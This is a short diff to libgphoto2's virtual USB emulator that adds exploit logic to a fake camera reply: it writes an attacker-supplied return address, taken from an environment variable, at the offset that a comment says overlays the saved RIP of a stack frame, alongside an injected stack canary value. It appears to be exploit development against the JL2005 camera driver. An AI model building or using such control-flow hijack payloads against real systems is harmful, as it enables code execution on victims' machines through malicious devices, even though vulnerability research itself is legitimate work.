@@ -1,0 +1,21 @@
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -188,6 +188,18 @@
+ 					for (i = 0; i < 8; i++)
+ 						bytes[0x3E30+i] = (char)((v >> (8*i)) & 0xff);
+ 				}
++				/* W191: clang frame reply 0x3E30 -> the spilled
++				 * priv slot at rbp-0x20, so the saved RIP at
++				 * rbp+8 is reply offset 0x3E58. */
++				if (m2[0] == 'p') {
++					const char *rs = getenv("M2SHELL_JL2005_RET");
++					if (rs && n >= 0x3E60) {
++						unsigned long long v = strtoull(rs, NULL, 0);
++						int j;
++						for (j = 0; j < 8; j++)
++							bytes[0x3E58+j] = (char)((v >> (8*j)) & 0xff);
++					}
++				}
+ 			}
+ 			if (m2[0] == 'c' && n >= 0x3E40) {
+ 				const char *ks = getenv("M2SHELL_JL2005_CANARY");
